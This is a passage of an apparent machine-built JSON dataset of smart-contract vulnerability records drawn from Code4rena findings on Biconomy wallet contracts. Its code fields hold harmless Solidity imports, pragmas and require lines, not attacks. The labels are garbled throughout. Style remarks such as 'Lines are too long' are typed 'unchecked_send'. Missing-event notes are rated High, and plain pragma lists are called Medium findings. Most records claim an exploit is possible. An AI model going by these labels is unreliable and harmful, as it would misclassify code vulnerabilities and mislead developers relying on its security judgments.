    "description": "__gap is empty reserved space in storage that is recommended to be put in place in upgradeable contracts. It allows new state variables to be added in the future without compromising the storage compatibility with existing deployments 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\"; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.351,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-07] Implementation contract may not be initialized",
    "description": "Implementation contract does not have a constructor with the initializer modifier therefore may be uninitialized. Implementation contracts should be initialized to avoid potential griefs or exploits. 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\"; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.351,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol::20 => function setupModules(address to, bytes memory data) internal {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "[N-03] Missing event for critical parameter change",
    "description": "Emitting events after sensitive changes take place, to facilitate tracking and notify off-chain clients following changes to the contract. 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol::20 => function setupModules(address to, bytes memory data) internal {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.158,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::46 => //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::239 => payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::357 => ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::489 => function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::46 => //     \"WalletTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::239 => payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::352 => ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::479 => function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[N-05] Lines are too long",
    "description": "Usually lines in source code are limited to 80 characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over 164 characters, the lines below should be split when they reach that length 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::46 => //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\" 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::239 => payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver); 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::357 => ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction` 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::489 => function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol#L2 => pragma solidity ^0.8.12;\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L6 => pragma solidity ^0.8.12;\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol#L2 => pragma solidity ^0.8.12;\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol#L2 => pragma solidity ^0.8.12;\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol#L6 => pragma solidity ^0.8.12;\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol#L2 => pragma solidity ^0.8.12;\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IStakeManager.sol#L2 => pragma solidity ^0.8.12;\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol#L2 => pragma solidity ^0.8.12;\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L2 => pragma solidity ^0.8.12;\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol#L2 => pragma solidity ^0.8.12;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings",
    "description": "https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol#L2 => pragma solidity ^0.8.12; https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L6 => pragma solidity ^0.8.12; https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol#L2 => pragma solidity ^0.8.12; https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol#L2 => pragma solidity ^0.8.12; https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol#L6 => pragma solidity ^0.8.12;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::6 => pragma solidity ^0.8.12;\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::2 => pragma solidity ^0.8.12;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::6 => pragma solidity ^0.8.12; scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::2 => pragma solidity ^0.8.12;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.213,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::39 \nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::45 \nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::57 \nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::60\nscw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::10\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::42\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::46\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::186\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::222\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::223\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::227\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::228\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::229\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::230\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::231\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::233\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::239\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::300\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::320\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::327\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::339\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::342\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::346\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::356\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::257\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::489\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol::24\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol::33\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::39 scw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::45 scw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::57 scw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::60 scw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::10",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 30,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::12 => import \"../interfaces/IAccount.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::13 => import \"../interfaces/IPaymaster.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::15 => import \"../interfaces/IAggregatedAccount.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::16 => import \"../interfaces/IEntryPoint.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::17 => import \"../utils/Exec.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::18 => import \"./StakeManager.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::19 => import \"./SenderCreator.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::4 => import \"../interfaces/IStakeManager.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\base\\Executor.sol::4 => import \"../common/Enum.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\base\\FallbackManager.sol::4 => import \"../common/SelfAuthorized.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::4 => import \"../common/Enum.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::5 => import \"../common/SelfAuthorized.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::6 => import \"./Executor.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\handler\\DefaultCallbackHandler.sol::4 => import \"../interfaces/ERC1155TokenReceiver.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\handler\\DefaultCallbackHandler.sol::5 => import \"../interfaces/ERC721TokenReceiver.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\handler\\DefaultCallbackHandler.sol::6 => import \"../interfaces/ERC777TokensRecipient.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\handler\\DefaultCallbackHandler.sol::7 => import \"../interfaces/IERC165.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\PaymasterHelpers.sol::4 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\PaymasterHelpers.sol::5 => import \"@account-abstraction/contracts/interfaces/UserOperation.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::5 => import \"../../BasePaymaster.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::6 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::7 => import \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::8 => import \"@openzeppelin/contracts/utils/Address.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::9 => import \"../../PaymasterHelpers.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::8 => import \"@account-abstraction/contracts/interfaces/IAccount.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::9 => import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::10 => import \"./common/Enum.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::4 => import \"./libs/LibAddress.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::5 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::6 => import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::8 => import \"./BaseSmartAccount.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::9 => import \"./common/Singleton.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::10 => import \"./base/ModuleManager.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::11 => import \"./base/FallbackManager.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::11 => import \"./base/FallbackManager.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::12 => import \"./common/SignatureDecoder.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::13 => import \"./common/SecuredTokenTransfer.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::14 => import \"./interfaces/ISignatureValidator.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::15 => import \"./interfaces/IERC165.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::16 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol::4 => import \"./Proxy.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol::5 => import \"./BaseSmartAccount.sol\"; \n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::12 => import \"../interfaces/IAccount.sol\"; scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::13 => import \"../interfaces/IPaymaster.sol\"; scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::15 => import \"../interfaces/IAggregatedAccount.sol\"; scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::16 => import \"../interfaces/IEntryPoint.sol\"; scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::17 => import \"../utils/Exec.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 45,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.166,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::64 => event ImplementationUpdated(address _scw, string version, address newImplementation);\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::65 => event EntryPointChanged(address oldEntryPoint, address newEntryPoint);\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::67 => event WalletHandlePayment(bytes32 txHash, uint256 payment);\nscw-contracts\\contracts\\smart-contract-wallet\\base\\Executor.sol::9 => event ExecutionFailure(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas);\nscw-contracts\\contracts\\smart-contract-wallet\\base\\Executor.sol::10 => event ExecutionSuccess(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas);\nscw-contracts\\contracts\\smart-contract-wallet\\base\\FallbackManager.sol::9 => event ChangedFallbackHandler(address handler);\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::11 => event EnabledModule(address module);\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::12 => event DisabledModule(address module);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::64 => event ImplementationUpdated(address _scw, string version, address newImplementation); scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::65 => event EntryPointChanged(address oldEntryPoint, address newEntryPoint); scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::67 => event WalletHandlePayment(bytes32 txHash, uint256 payment); scw-contracts\\contracts\\smart-contract-wallet\\base\\Executor.sol::9 => event ExecutionFailure(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas); scw-contracts\\contracts\\smart-contract-wallet\\base\\Executor.sol::10 => event ExecutionSuccess(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::224 => require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::232 => require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::262 => require(success, \"BSA011\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::265 => require(transferToken(gasToken, receiver, payment), \"BSA012\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::286 => require(success, \"BSA011\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::289 => require(transferToken(gasToken, receiver, payment), \"BSA012\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::294 => revert(string(abi.encodePacked(requiredGas)));\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::322 => require(uint256(s) >= uint256(1) * 65, \"BSA021\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::325 => require(uint256(s) + 32 <= signatures.length, \"BSA022\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::333 => require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::342 => require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::371 => require(execute(to, value, data, operation, gasleft()));\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::528 => require(req);\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::21 => require(modules[SENTINEL_MODULES] == address(0), \"BSA100\");\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::25 => require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), \"BSA000\");\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::34 => require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::36 => require(modules[module] == address(0), \"BSA102\");\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::49 => require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::50 => require(modules[prevModule] == module, \"BSA103\");\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::68 => require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::224 => require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\"); scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::232 => require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\"); scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::262 => require(success, \"BSA011\"); scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::265 => require(transferToken(gasToken, receiver, payment), \"BSA012\"); scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::286 => require(success, \"BSA011\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::73 => unchecked {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::185 => unchecked {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::249 => unchecked {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::290 => internal returns (uint256 gasUsedByValidateAccountPrepayment, address actualAggregator, uint256 deadline) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::291 => unchecked {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::350 => unchecked {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::386 => private returns (address actualAggregator, uint256 deadline) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::417 => unchecked {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::442 => unchecked {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::485 => unchecked {\n\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::119 =>function _postOp(\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::123 => ) internal virtual override {\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::129 => 